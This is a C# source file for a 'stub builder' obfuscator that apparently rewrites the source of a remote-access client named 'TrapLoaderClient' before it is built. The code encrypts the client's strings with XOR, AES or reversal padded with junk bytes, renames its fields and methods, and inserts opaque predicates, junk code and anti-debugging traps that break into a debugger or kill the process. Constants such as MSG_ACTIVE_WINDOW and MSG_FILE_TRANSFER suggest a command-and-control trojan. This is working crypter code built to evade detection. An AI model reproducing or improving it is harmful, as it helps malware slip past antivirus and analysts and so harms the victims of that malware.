using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace StubBuilder
{
    public static class StubObfuscator
    {
        private static readonly string _allowedChars = "abcdefghijklmnopqrstuvwxyz";

        private static string RandomString(int len)
        {
            byte[] bytes = new byte[len];
            using (var rng = RandomNumberGenerator.Create()) rng.GetBytes(bytes);
            return new string(bytes.Select(b => _allowedChars[b % _allowedChars.Length]).ToArray());
        }

        public static string Obfuscate(string s)
        {
            var sw = System.Diagnostics.Stopwatch.StartNew();
            Console.WriteLine($"[obf] Start: {s.Length} chars");
            // Algorithm polymorphism
            var rngAlgo = RandomNumberGenerator.Create();
            byte[] algoBuf = new byte[1];
            rngAlgo.GetBytes(algoBuf);
            int algo = algoBuf[0] % 3;

            byte[] keyTable = new byte[32];
            using (var rng = RandomNumberGenerator.Create()) rng.GetBytes(keyTable);
            string kf = "_" + RandomString(7);
            string dm = "_" + RandomString(9);

            byte[] aesKey = new byte[16];
            byte[] aesIv = new byte[16];
            using (var rngAes = RandomNumberGenerator.Create()) { rngAes.GetBytes(aesKey); rngAes.GetBytes(aesIv); }

            // Step 1: Pre-compute attribute block ranges to skip during string encryption
            var attrRanges = new List<(int start, int end)>();
            {
                int j = 0;
                while (j < s.Length)
                {
                    if (s[j] == '"')
                    {
                        if (j + 1 < s.Length && s[j + 1] == '"') { j += 2; }
                        else
                        {
                            j++;
                            while (j < s.Length && s[j] != '"')
                            {
                                if (s[j] == '\\' && j + 1 < s.Length) j += 2;
                                else j++;
                            }
                            if (j < s.Length) j++;
                        }
                    }
                    else if (s[j] == '@' && j + 1 < s.Length && s[j + 1] == '"')
                    {
                        j += 2;
                        while (j < s.Length)
                        {
                            if (s[j] == '"')
                            {
                                if (j + 1 < s.Length && s[j + 1] == '"') j += 2;
                                else { j++; break; }
                            }
                            else j++;
                        }
                    }
                    else if (s[j] == '[' && j + 1 < s.Length && char.IsUpper(s[j + 1]))
                    {
                        int start = j;
                        int depth = 1;
                        j++;
                        while (j < s.Length && depth > 0)
                        {
                            if (s[j] == '[') depth++;
                            else if (s[j] == ']') depth--;
                            if (depth > 0) j++;
                        }
                        if (depth == 0) { j++; attrRanges.Add((start, j)); }
                        else { j++; }
                    }
                    else { j++; }
                }
            }
            Console.WriteLine($"[obf] Step1 (find attrs): {sw.ElapsedMilliseconds}ms ({attrRanges.Count} attrs)");

            // Step 1b: Protect verbatim strings (@"...") from the string encryption regex
            // The encryption regex treats \ as escape chars, but in @"..." strings \ is literal
            var vbMap = new Dictionary<string, string>();
            int vbIdx = 0;
            s = Regex.Replace(s, @"@""(?:[^""]|"")*""", m =>
            {
                string p = "##VBSTR" + vbIdx + "##";
                vbMap[p] = m.Value;
                vbIdx++;
                return p;
            });
            Console.WriteLine($"[obf] Step1b (protect verbatim): {sw.ElapsedMilliseconds}ms ({vbIdx} strings)");

            // Step 2: Encrypt strings
            var rngKey = RandomNumberGenerator.Create();
            s = Regex.Replace(s, @"""[^""\\]*(?:\\.[^""\\]*)*""", m =>
            {
                if (m.Index > 0 && s[m.Index - 1] == '\'') return m.Value;
                string before = s.Substring(Math.Max(0, m.Index - 10), Math.Min(10, m.Index));
                if (Regex.IsMatch(before, @"case\s*$")) return m.Value;
                foreach (var r in attrRanges)
                    if (m.Index >= r.start && m.Index + m.Length <= r.end) return m.Value;
                string inner = m.Value.Substring(1, m.Value.Length - 2);
                if (inner.Length == 0) return m.Value;
                string decoded = DecodeEscapes(inner);
                byte[] data = Encoding.UTF8.GetBytes(decoded);

                byte[] encrypted;
                int keyIdx = 0;

                switch (algo)
                {
                    case 0:
                        {
                            byte[] idxBuf = new byte[1];
                            rngKey.GetBytes(idxBuf);
                            keyIdx = idxBuf[0] % keyTable.Length;
                            byte keyByte = keyTable[keyIdx];
                            encrypted = new byte[data.Length];
                            for (int i = 0; i < data.Length; i++)
                                encrypted[i] = (byte)(data[i] ^ keyByte);
                        }
                        break;
                    case 1:
                        {
                            using (var aes = Aes.Create())
                            {
                                aes.Key = aesKey;
                                aes.IV = aesIv;
                                aes.Mode = CipherMode.CBC;
                                aes.Padding = PaddingMode.PKCS7;
                                using (var encryptor = aes.CreateEncryptor())
                                    encrypted = encryptor.TransformFinalBlock(data, 0, data.Length);
                            }
                        }
                        break;
                    default:
                        encrypted = (byte[])data.Clone();
                        Array.Reverse(encrypted);
                        break;
                }

                // Junk byte interleaving
                byte[] jprBuf = new byte[1]; rngKey.GetBytes(jprBuf);
                int junkPerReal = 2 + (jprBuf[0] % 3);
                byte[] junkPool = new byte[encrypted.Length * junkPerReal + 16];
                rngKey.GetBytes(junkPool);
                var interleaved = new List<byte>(encrypted.Length * (junkPerReal + 1) + 1);
                interleaved.Add((byte)junkPerReal);
                int ji = 0;
                foreach (byte b in encrypted)
                {
                    for (int j = 0; j < junkPerReal; j++) interleaved.Add(junkPool[ji++ % junkPool.Length]);
                    interleaved.Add(b);
                }
                return dm + "(new byte[] { " + string.Join(",", interleaved.Select(b => "0x" + b.ToString("X2"))) + " }, " + keyIdx + ")";
            });
            Console.WriteLine($"[obf] Step 2 (encrypt strings): {sw.ElapsedMilliseconds}ms");
            // DEBUG: Check if DriverDesc survived encryption
            int ddIdx = s.IndexOf("DriverDesc");
            if (ddIdx >= 0)
            {
                int start = Math.Max(0, ddIdx - 40);
                Console.WriteLine($"[obf] WARNING: 'DriverDesc' found at index {ddIdx}: ...{s.Substring(start, 120)}...");
            }
            else
            {
                Console.WriteLine($"[obf] OK: 'DriverDesc' fully encrypted (not found in source)");
            }
            // Also check for quoted DriverDesc (string literal survived)
            ddIdx = s.IndexOf("\"DriverDesc\"");
            if (ddIdx >= 0)
            {
                int start = Math.Max(0, ddIdx - 40);
                Console.WriteLine($"[obf] WARNING: quoted 'DriverDesc' at index {ddIdx}: ...{s.Substring(start, 120)}...");
            }
            // DEBUG: Check for 'dm(' calls on the giant line
            int lineStart = s.LastIndexOf('\n', s.IndexOf("new byte[] { 0x"));
            if (lineStart < 0) lineStart = 0;
            var dmCallMatches = Regex.Matches(s.Substring(lineStart, Math.Min(200, s.Length - lineStart)), Regex.Escape(dm) + @"\(");
            Console.WriteLine($"[obf] First dm() calls on giant line: {dmCallMatches.Count}");

            // Restore verbatim strings
            foreach (var kv in vbMap)
                s = s.Replace(kv.Key, kv.Value);
            Console.WriteLine($"[obf] Step1b (restore verbatim strings): {sw.ElapsedMilliseconds}ms");

            // Step 4: Insert decrypt helper
            string helper;
            string keyTableBytes = string.Join(",", keyTable.Select(b => (int)b));
            string aesKeyBytes = string.Join(",", aesKey.Select(b => (int)b));
            string aesIvBytes = string.Join(",", aesIv.Select(b => (int)b));

            string varI = "_" + RandomString(4);
            string varN = "_" + RandomString(4);
            string varR = "_" + RandomString(4);
            string varS = "_" + RandomString(4);
            string stripJunk = "int " + varS + "=d[0];int " + varN + "=(d.Length-1)/(" + varS + "+1);byte[] " + varR + "=new byte[" + varN + "];for(int " + varI + "=0;" + varI + "<" + varN + ";" + varI + "++){" + varR + "[" + varI + "]=d[1+" + varI + "*(" + varS + "+1)+" + varS + "];}";

            switch (algo)
            {
                case 0:
                    helper = "\r\n    private static byte[] " + kf + " = new byte[] { " + keyTableBytes + " };\r\n" +
                        "    private static string " + dm + "(byte[] d, int ki) { " + stripJunk + " byte k = " + kf + "[ki % " + keyTable.Length + "]; for (int " + varI + "=0;" + varI + "<" + varR + ".Length;" + varI + "++) " + varR + "[" + varI + "] ^= k; return Encoding.UTF8.GetString(" + varR + "); }\r\n";
                    break;
                case 1:
                    string ivName = "_iv" + RandomString(4);
                    helper = "\r\n    private static byte[] " + kf + " = new byte[] { " + aesKeyBytes + " };\r\n" +
                        "    private static byte[] " + ivName + " = new byte[] { " + aesIvBytes + " };\r\n" +
                        "    private static string " + dm + "(byte[] d, int ki) { " + stripJunk + " using (var a = Aes.Create()) { a.Key = " + kf + "; a.IV = " + ivName + "; a.Mode = CipherMode.CBC; a.Padding = PaddingMode.PKCS7; using (var dec = a.CreateDecryptor()) { byte[] plain = dec.TransformFinalBlock(" + varR + ", 0, " + varR + ".Length); return Encoding.UTF8.GetString(plain); } } }\r\n";
                    break;
                default:
                    helper = "\r\n    private static byte[] " + kf + " = new byte[1];\r\n" +
                        "    private static string " + dm + "(byte[] d, int ki) { " + stripJunk + " Array.Reverse(" + varR + "); return Encoding.UTF8.GetString(" + varR + "); }\r\n";
                    break;
            }
            int bracePos = s.IndexOf('{', s.IndexOf("class ")) + 1;
            s = s.Insert(bracePos, helper);
            Console.WriteLine($"[obf] Step 4 (insert helper): {sw.ElapsedMilliseconds}ms");

            // Insert into PluginRunner too
            int pluginRunnerIdx = s.IndexOf("public class PluginRunner");
            if (pluginRunnerIdx >= 0)
            {
                int prBrace = s.IndexOf('{', pluginRunnerIdx) + 1;
                s = s.Insert(prBrace, helper);
            }
            Console.WriteLine($"[obf] PluginRunner: {sw.ElapsedMilliseconds}ms");

            // Step 5: Rename class
            s = Regex.Replace(s, @"\bclass\s+TrapLoaderClient\b", "class _" + RandomString(10));
            Console.WriteLine($"[obf] Step5: {sw.ElapsedMilliseconds}ms");

            // Step 6: Rename fields
            var fieldPat = Regex.Matches(s, @"private\s+static\s+(?:\w+\s+)*([A-Za-z_]\w*)\s*[=;]");
            Console.WriteLine($"[obf] Step6a RegexMatches: {sw.ElapsedMilliseconds}ms ({fieldPat.Count} fields)");
            var fieldMap = new Dictionary<string, string>();
            var usedNames = new HashSet<string>();
            string GenName(int len)
            {
                string cand;
                do { cand = "_" + RandomString(len); } while (usedNames.Contains(cand));
                usedNames.Add(cand);
                return cand;
            }
            foreach (Match m in fieldPat)
                if (!fieldMap.ContainsKey(m.Groups[1].Value))
                    fieldMap[m.Groups[1].Value] = GenName(6);
            string[] extraFields = { "serverCertBase64", "silentMode", "serverPassword", "activePlugins", "PluginEntry" };
            foreach (string f in extraFields)
                if (!fieldMap.ContainsKey(f))
                    fieldMap[f] = GenName(6);
            // Step 7: Rename methods
            var methodPat = Regex.Matches(s, @"private\s+static\s+(?!extern)(?:async\s+)?(\w+(?:<[^>]+>)?(?:\[\])?)\s+([A-Za-z]\w*)\s*\(");
            Console.WriteLine($"[obf] Step7a RegexMatches: {sw.ElapsedMilliseconds}ms ({methodPat.Count} methods)");
            var methodMap = new Dictionary<string, string>();
            foreach (Match m in methodPat)
            {
                string n = m.Groups[2].Value;
                if (n == "Main" || n == dm) continue;
                if (!methodMap.ContainsKey(n)) methodMap[n] = GenName(8);
            }
            Console.WriteLine($"[obf] Field map ({fieldMap.Count}):");
            foreach (var kv in fieldMap.OrderByDescending(kv => kv.Key.Length))
                Console.WriteLine($"  FIELD: '{kv.Key}' -> '{kv.Value}'");
            Console.WriteLine($"[obf] Method map ({methodMap.Count}):");
            foreach (var kv in methodMap.OrderByDescending(kv => kv.Key.Length))
                Console.WriteLine($"  METHOD: '{kv.Key}' -> '{kv.Value}'");
            Console.WriteLine($"[obf] dm='{dm}' kf='{kf}'");

            // Rename fields (longest first to avoid partial matches)
            foreach (var kv in fieldMap.OrderByDescending(kv => kv.Key.Length))
                s = Regex.Replace(s, @"\b" + Regex.Escape(kv.Key) + @"\b", kv.Value);
            Console.WriteLine($"[obf] Fields renamed: {sw.ElapsedMilliseconds}ms");
            // DEBUG: Check if field rename broke anything
            ddIdx = s.IndexOf("DriverDesc");
            if (ddIdx >= 0)
            {
                int start = Math.Max(0, ddIdx - 40);
                Console.WriteLine($"[obf] CRITICAL: 'DriverDesc' appeared after field rename at {ddIdx}: ...{s.Substring(start, Math.Min(120, s.Length - start))}...");
            }

            // Rename methods (longest first to avoid partial matches)
            foreach (var kv in methodMap.OrderByDescending(kv => kv.Key.Length))
                s = Regex.Replace(s, @"\b" + Regex.Escape(kv.Key) + @"\b", kv.Value);
            Console.WriteLine($"[obf] Step6+7: {sw.ElapsedMilliseconds}ms");
            // DEBUG: Check if method rename broke anything
            ddIdx = s.IndexOf("DriverDesc");
            if (ddIdx >= 0)
            {
                int start = Math.Max(0, ddIdx - 40);
                Console.WriteLine($"[obf] CRITICAL: 'DriverDesc' appeared after method rename at {ddIdx}: ...{s.Substring(start, Math.Min(120, s.Length - start))}...");
            }
            // DEBUG: Check pattern: }) followed by identifier( — missing semicolon
            var brokenCalls = Regex.Matches(s, @"\},\s*\d+\)\s*[A-Za-z_]\w*\(");
            Console.WriteLine($"[obf] Broken call patterns (}})IDENT(): {brokenCalls.Count}");
            foreach (Match bm in brokenCalls)
            {
                int start = Math.Max(0, bm.Index - 10);
                Console.WriteLine($"  at {bm.Index}: {s.Substring(start, Math.Min(80, s.Length - start))}");
                if (brokenCalls.Count > 5) break;
            }

            // Step 8: Constant obfuscation — DISABLED (corrupts byte array hex values)
            // var rng2 = RandomNumberGenerator.Create();
            // s = ObfuscateConstants(s, rng2);

            // Step 10: Opaque predicates
            Console.WriteLine($"[obf] Step10 start: {sw.ElapsedMilliseconds}ms");
            s = InsertOpaquePredicates(s);
            Console.WriteLine($"[obf] Step10 done: {sw.ElapsedMilliseconds}ms, {s.Length} chars");

            // Step 13: Junk code
            Console.WriteLine($"[obf] Step13 start: {sw.ElapsedMilliseconds}ms");
            s = InsertJunkCode(s);
            Console.WriteLine($"[obf] Step13 done: {sw.ElapsedMilliseconds}ms, {s.Length} chars");

            return s;
        }

        private static string DecodeEscapes(string inner)
        {
            return Regex.Replace(inner, @"\\(.)", em =>
            {
                char c = em.Groups[1].Value[0];
                switch (c)
                {
                    case '"': return "\"";
                    case '\\': return "\\";
                    case 'n': return "\n";
                    case 'r': return "\r";
                    case 't': return "\t";
                    case '0': return "\0";
                    case 'a': return "\a";
                    case 'b': return "\b";
                    case 'f': return "\f";
                    case 'v': return "\v";
                    default: return "\\" + c;
                }
            });
        }

        private static string ObfuscateConstants(string s, RandomNumberGenerator rng)
        {
            string[] knownSwitchConsts = { "MSG_AUTH", "MSG_HEARTBEAT", "MSG_CLIENT_INFO", "MSG_ACTIVE_WINDOW",
                "MSG_PLUGIN_DATA", "MSG_PLUGIN_BATCH", "MSG_AUTH_OK", "MSG_AUTH_FAIL", "MSG_HEARTBEAT_ACK",
                "MSG_PLUGIN_CMD", "MSG_FILE_TRANSFER", "MSG_DISCONNECT" };

            s = Regex.Replace(s, @"(?<=[\s=;|&+\-*/^(!<>[\]]|^)0x([0-9A-Fa-f]{1,8})(?![0-9A-Fa-f])", m =>
            {
                int pos = m.Index;
                int quoteCount = 0;
                for (int i = 0; i < pos; i++)
                    if (s[i] == '"' && (i == 0 || s[i - 1] != '\\'))
                        quoteCount++;
                if (quoteCount % 2 == 1) return m.Value;

                // Skip hex literals inside byte array initializers (encrypted data)
                // These are followed by , or } (with optional whitespace)
                if (pos + m.Length < s.Length)
                {
                    char next = s[pos + m.Length];
                    if (next == ',' || next == '}') return m.Value;
                    if (next == ' ' && pos + m.Length + 1 < s.Length)
                    {
                        char next2 = s[pos + m.Length + 1];
                        if (next2 == ',' || next2 == '}') return m.Value;
                    }
                }

                string hex = m.Groups[1].Value;
                uint val = Convert.ToUInt32(hex, 16);
                if (val == 0) return m.Value;

                byte[] buf = new byte[4];
                rng.GetBytes(buf);
                uint a = (uint)(buf[0] | (buf[1] << 8) | (buf[2] << 16) | (buf[3] << 24));
                uint b = a ^ val;

                if (val <= 0xFF)
                    return $"((byte)0x{a & 0xFF:X2} ^ (byte)0x{b & 0xFF:X2})";
                else if (val <= 0xFFFF)
                    return $"((ushort)0x{a & 0xFFFF:X4} ^ (ushort)0x{b & 0xFFFF:X4})";
                else
                    return $"(0x{a:X8}u ^ 0x{b:X8}u)";
            });

            return s;
        }

        private static string InsertOpaquePredicates(string s)
        {
            var rng = RandomNumberGenerator.Create();
            byte[] randBytes = new byte[4];
            rng.GetBytes(randBytes);
            int seed = randBytes[0] | (randBytes[1] << 8);

            string deadBlock = "\r\n    private static int _op" + RandomString(4) + " = " + seed + ";\r\n";

            string varA = "_opa" + RandomString(4);
            string varB = "_opb" + RandomString(4);
            string varC = "_opc" + RandomString(4);

            deadBlock += "    private static int " + varA + " = " + (seed + 1) + ";\r\n";
            deadBlock += "    private static int " + varB + " = " + (seed + 2) + ";\r\n";
            deadBlock += "    private static int " + varC + " = " + (seed + 3) + ";\r\n";

            int bracePos = s.IndexOf('{', s.IndexOf("class ")) + 1;
            s = s.Insert(bracePos, deadBlock);

            string deadCatchVar = "_dch" + RandomString(4);
            string deadCatch = "\r\n    private static void " + deadCatchVar + "() {\r\n" +
                "        try { throw new SystemException(\"\" + " + seed + "); }\r\n" +
                "        catch { }\r\n" +
                "        try { throw new InvalidCastException(); }\r\n" +
                "        catch (InvalidCastException) { }\r\n" +
                "        try { throw new OverflowException(); }\r\n" +
                "        catch (OverflowException) { }\r\n" +
                "    }\r\n";

            int opcIdx = s.IndexOf(varC + " = ");
            if (opcIdx < 0) opcIdx = s.IndexOf(varC);
            int insertAfter = s.IndexOf("\r\n", opcIdx) + 2;
            s = s.Insert(insertAfter, deadCatch);

            string deadCaller = "_dcl" + RandomString(4);
            string deadCallerCode = "\r\n    private static void " + deadCaller + "() {\r\n" +
                "        if (" + varA + " * (" + varA + " - 1) % 2 != 0) " + deadCatchVar + "();\r\n" +
                "        if (" + varB + " * (" + varB + " - 1) % 2 != 0) " + deadCatchVar + "();\r\n" +
                "    }\r\n";
            s = s.Insert(insertAfter + deadCatch.Length, deadCallerCode);

            string antiDebugVar = "_adb" + RandomString(4);
            string antiDebugInit = "\r\n    private static int " + antiDebugVar + " = " + (seed + 777) + ";\r\n";
            s = s.Insert(insertAfter + deadCatch.Length + deadCallerCode.Length, antiDebugInit);

            string antiDebugMethod = "_adbg" + RandomString(4);
            string antiDebugCode = "\r\n    private static void " + antiDebugMethod + "() {\r\n" +
                "        if (" + antiDebugVar + " * (" + antiDebugVar + " - 1) % 2 != 0) {\r\n" +
                "            System.Diagnostics.Debugger.Break();\r\n" +
                "            throw new InvalidOperationException();\r\n" +
                "        }\r\n" +
                "        if (" + antiDebugVar + " * (" + antiDebugVar + " - 1) % 2 != 0) {\r\n" +
                "            int _d = " + (seed + 888) + ";\r\n" +
                "            _d = _d * _d;\r\n" +
                "            System.Diagnostics.Process.GetCurrentProcess().Kill();\r\n" +
                "        }\r\n" +
                "    }\r\n";
            int classOpen = s.IndexOf('{', s.IndexOf("class "));
            int depth = 0;
            int classClose = -1;
            for (int i = classOpen; i < s.Length; i++)
            {
                if (s[i] == '{') depth++;
                else if (s[i] == '}')
                {
                    depth--;
                    if (depth == 0) { classClose = i; break; }
                }
            }
            if (classClose >= 0) s = s.Insert(classClose, antiDebugCode);

            return s;
        }

        private static string InsertJunkCode(string s)
        {
            var rng = RandomNumberGenerator.Create();
            byte[] seedBuf = new byte[8];
            rng.GetBytes(seedBuf);
            int seed = seedBuf[0] | (seedBuf[1] << 8) | (seedBuf[2] << 16) | (seedBuf[3] << 24);

            int bracePos = s.IndexOf('{', s.IndexOf("class ")) + 1;
            string junkFields = "";

            int genNum = (int)(DateTime.UtcNow.Ticks % 99999) + 1;
            string genName = "_gen" + RandomString(4);
            junkFields += "    private static int " + genName + " = " + genNum + ";\r\n";

            for (int i = 0; i < 5; i++)
            {
                string jfName = "_jfs" + RandomString(6);
                string jfVal = Convert.ToBase64String(Encoding.UTF8.GetBytes("_" + RandomString(12) + "_"));
                junkFields += "    private static string " + jfName + " = \"" + jfVal + "\";\r\n";
            }
            for (int i = 0; i < 3; i++)
            {
                string jiName = "_jfi" + RandomString(6);
                int jiVal = (seed + i * 7919) & 0x7FFFFFFF;
                junkFields += "    private static int " + jiName + " = " + jiVal + ";\r\n";
            }
            s = s.Insert(bracePos, junkFields);

            string deadSleepVar = "_dsl" + RandomString(4);
            string deadSleepInit = "\r\n    private static int " + deadSleepVar + " = " + (seed + 100) + ";\r\n";
            int classBrace = s.IndexOf('{', s.IndexOf("class "));
            if (classBrace >= 0) s = s.Insert(classBrace + 1, deadSleepInit);

            int methodCount = 0;
            s = Regex.Replace(s, @"(private\s+static\s+(?!extern)(?:async\s+)?\w+(?:\[\])?\s+\w+\s*\([^)]*\)\s*\{)", m =>
            {
                methodCount++;
                if (methodCount % 4 != 0) return m.Value;

                string ja = "_za" + RandomString(5);
                string jb = "_zb" + RandomString(5);
                int va = (seed + methodCount * 3571) & 0xFFFF;
                int vb = (seed + methodCount * 6151) & 0xFFFF;
                int variant = methodCount % 4;

                string junkBlock;
                switch (variant)
                {
                    case 0:
                        junkBlock = "\r\n        int " + ja + " = " + va + ";\r\n" +
                            "        int " + jb + " = " + vb + ";\r\n" +
                            "        " + ja + " = " + jb + ";\r\n" +
                            "        " + jb + " = " + ja + ";\r\n";
                        break;
                    case 1:
                        junkBlock = "\r\n        int " + ja + " = " + va + ";\r\n" +
                            "        int " + jb + " = " + vb + ";\r\n" +
                            "        " + ja + " = " + ja + " + " + jb + ";\r\n" +
                            "        " + jb + " = " + ja + " - " + jb + ";\r\n" +
                            "        " + ja + " = " + ja + " - " + jb + ";\r\n";
                        break;
                    case 2:
                        junkBlock = "\r\n        int " + ja + " = " + va + ";\r\n" +
                            "        int " + jb + " = " + vb + ";\r\n" +
                            "        " + ja + " = " + ja + " ^ " + jb + ";\r\n" +
                            "        " + jb + " = " + ja + " ^ " + jb + ";\r\n" +
                            "        " + ja + " = " + ja + " ^ " + jb + ";\r\n";
                        break;
                    default:
                        junkBlock = "\r\n        int " + ja + " = " + va + ";\r\n" +
                            "        int " + jb + " = " + vb + ";\r\n" +
                            "        " + ja + " = " + ja + " + " + jb + ";\r\n" +
                            "        " + ja + " = " + ja + " - " + jb + ";\r\n" +
                            "        " + jb + " = " + jb + " + " + ja + ";\r\n" +
                            "        " + jb + " = " + jb + " - " + ja + ";\r\n";
                        break;
                }

                return m.Value + junkBlock;
            });

            string bait1 = "_bait" + RandomString(5);
            string bait2 = "_bait" + RandomString(5);
            string baitCode = "\r\n    private static void " + bait1 + "() {\r\n" +
                "        if (" + deadSleepVar + " * (" + deadSleepVar + " - 1) % 2 != 0) {\r\n" +
                "            int _x = " + (seed + 200) + ";\r\n" +
                "            _x = _x * " + (seed + 300) + ";\r\n" +
                "            throw new InvalidOperationException(\"\" + _x);\r\n" +
                "        }\r\n" +
                "    }\r\n" +
                "\r\n    private static void " + bait2 + "() {\r\n" +
                "        if (" + deadSleepVar + " * (" + deadSleepVar + " - 1) % 2 != 0) {\r\n" +
                "            int _y = " + (seed + 500) + ";\r\n" +
                "            _y = _y ^ " + (seed + 600) + ";\r\n" +
                "            Thread.Sleep(_y);\r\n" +
                "        }\r\n" +
                "    }\r\n";

            int junkClassOpen = s.IndexOf('{', s.IndexOf("class "));
            int junkDepth = 0;
            int junkClassClose = -1;
            for (int i = junkClassOpen; i < s.Length; i++)
            {
                if (s[i] == '{') junkDepth++;
                else if (s[i] == '}')
                {
                    junkDepth--;
                    if (junkDepth == 0) { junkClassClose = i; break; }
                }
            }
            if (junkClassClose >= 0) s = s.Insert(junkClassClose, baitCode);

            return s;
        }
    }
}
